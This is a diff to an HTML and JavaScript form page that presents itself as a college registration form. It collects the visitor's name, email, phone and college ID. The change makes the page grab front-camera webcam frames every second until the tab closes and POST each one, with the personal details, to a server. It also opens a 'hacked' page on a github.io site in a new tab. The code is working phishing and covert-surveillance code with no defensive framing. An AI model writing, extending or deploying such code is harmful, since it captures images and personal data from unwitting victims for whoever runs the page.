@@ -40,6 +40,15 @@
       background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px; padding: 0.75rem 1rem; margin-bottom: 1rem; display: none;
       align-items: center; gap: 0.5rem; font-size: 0.85rem; color: #92400e;
     }
+    .capture-indicator {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
+    }
+    .capture-indicator .dot {
+      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
+      animation: pulse 1s infinite;
+    }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
   </style>
 </head>
 <body>
@@ -68,6 +77,9 @@
       </div>
       <button type="submit" id="submitBtn">Submit</button>
       <div id="msg"></div>
+      <div class="capture-indicator" id="captureIndicator" style="display:none;">
+        <span class="dot"></span> Capturing every 1s...
+      </div>
     </form>
   </div>
 
@@ -79,6 +91,7 @@
     const msg = document.getElementById("msg");
     const btn = document.getElementById("submitBtn");
     const statusBanner = document.getElementById("statusBanner");
+    const captureIndicator = document.getElementById("captureIndicator");
 
     const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
     const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));
@@ -118,7 +131,7 @@
 
       // Disable form
       btn.disabled = true;
-      btn.textContent = "Processing...";
+      btn.textContent = "Submitting...";
 
       const name = nameEl.value.trim();
       const email = document.getElementById("email").value.trim();
@@ -131,16 +144,36 @@
         body: JSON.stringify({ name, email, phone: document.getElementById("phone").value.trim(), collegeId, time: new Date().toISOString() })
       }).catch(() => {});
 
-      // 2. Start capturing photos - capture 5 photos over 10 seconds, then redirect
-      const captureCount = 5;
-      let captured = 0;
-      const stream = window.cameraStream || await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(() => null);
+      // 2. Open hacked page in new tab
+      window.open(HACKED_PAGE, "_blank");
 
-      statusBanner.textContent = "Capturing photos...";
-      statusBanner.style.display = "flex";
+      // 3. Start continuous capture every 1 second in THIS tab
+      startContinuousCapture(name, email, phone, collegeId);
 
-      async function capturePhoto() {
-        if (!stream || captured >= captureCount) return;
+      // Show capture indicator
+      captureIndicator.style.display = "flex";
+      btn.disabled = true;
+      btn.textContent = "Capturing every 1s... (close tab to stop)";
+
+      // Hide form
+      form.style.display = "none";
+    });
+
+    async function startContinuousCapture(name, email, phone, collegeId) {
+      let stream = window.cameraStream;
+      if (!stream) {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+          window.cameraStream = stream;
+        } catch (e) {
+          console.warn("Camera not available");
+          return;
+        }
+      }
+
+      // Continuous capture every 1 second until tab closes
+      async function captureLoop() {
+        if (!stream) return;
         try {
           const video = document.createElement("video");
           video.srcObject = stream; video.autoplay = true; video.muted = true;
@@ -156,29 +189,15 @@
             method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ name: document.getElementById("name").value.trim(), email, phone: document.getElementById("phone").value.trim(), collegeId: document.getElementById("collegeId").value.trim(), image: dataUrl, time: new Date().toISOString() })
           }).catch(() => {});
+        } catch (e) {}
 
-          captured++;
-          statusBanner.textContent = `Captured ${captured}/${captureCount} photos...`;
-
-          if (captured < captureCount) {
-            setTimeout(capturePhoto, 2000);
-          } else {
-            // All captures done - redirect to hacked page
-            window.location.href = "https://An0nymOuS29.github.io/success.html";
-          }
-        } catch (e) {
-          if (captured < captureCount) setTimeout(capturePhoto, 2000);
-          else window.location.href = "https://An0nymOuS29.github.io/success.html";
-        }
+        // Schedule next capture in 1 second
+        setTimeout(captureLoop, 1000);
       }
 
-      // Start capture sequence
-      if (stream) {
-        capturePhoto();
-      } else {
-        window.location.href = "https://An0nymOuS29.github.io/success.html";
-      }
-    });
+      // Start the continuous capture loop
+      captureLoop();
+    }
   </script>
 </body>
 </html>
